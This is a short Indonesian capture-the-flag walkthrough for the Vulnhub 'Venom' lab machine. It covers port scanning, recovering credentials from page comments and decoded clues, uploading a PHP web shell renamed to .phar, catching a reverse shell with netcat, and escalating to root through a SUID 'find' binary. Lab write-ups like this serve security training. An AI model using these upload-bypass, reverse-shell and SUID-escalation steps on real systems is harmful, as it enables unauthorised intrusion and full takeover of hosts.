@@ -1,0 +1,27 @@
+Walkthrough Vulnhub Venom
+
+1. Scan Port dan hasilnya speerti ini :
+PORT    STATE SERVICE
+21/tcp  open  ftp
+80/tcp  open  http
+139/tcp open  netbios-ssn
+443/tcp open  https
+445/tcp open  microsoft-ds
+
+2. Access ke ftp dengan user hostinger dan password hostinger (didapat dari web <!...<5f2a66f947fa5690c26506f66bde5c23> follow this to get access on somewhere.....--> ) dan dapetin hint.txt
+
+3. Setelah itu decode 2 clue 
+a. echo "WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=" | base64 -d | base64 -d | base64 -d ; standard vigenere cipher
+b. echo "aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=" | base64 -d; https://cryptii.com/pipes/vigenere-cipher
+
+4. Decode cipher "L7f9l8@J#p%Ue+Q1234" dengan key hostinger. Next edit /etc/hosts tambahkan venom.box sesuaikan dengan ip vm yang di attack
+
+5. Login dengan user dora dan password hasil decodenya "E7r9t8@Q#h%Hy+M1234" . Next setelah login kita upload shell php, di venom.box/panel/uploads. Ganti .php ke .phar setelah sudah diupload lanjut ke venom.box/upload/(nama_file_shell).phar. Jangan lupa nc -nlvp dulu supaya konek ke shell nya
+
+6. Kalau sudah konek next kita lihat user apa saja yang ada di vm itu dengan cat /etc/passwd | grep bash. ternyata ada hostinger dan nathan. yap ada clue lagi di /var/backup.bak/.backup.txt :
+user: hostinger
+password: hostinger
+
+7. Akhirnya su hostinger dan password dari itu, jangan lupa [python3 -c 'import pty;pty.spawn("/bin/bash")']. dikit lagi mamang, masuk ke directory /var/www/html/subrion/backup dan ternyata disana terdapat huruf gajelas yang merupakan password si nathan "FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a". Dan su aja bung seketika dapet flag :W3_@r3_V3n0m:P
+
+8. Next kita cari vuln sudonya apa dengan : find / -perm -4000 -exec ls -al {} \; 2>/dev/null , dan ternyata terdapat : /usr/bin/find . Kita cari aja vulnnya di gtfobins . dan  dengan command ini maka anda akan dapatkan flag "find . -exec /bin/bash \; -quit" dan flagnya : H@v3_a_n1c3_l1fe.
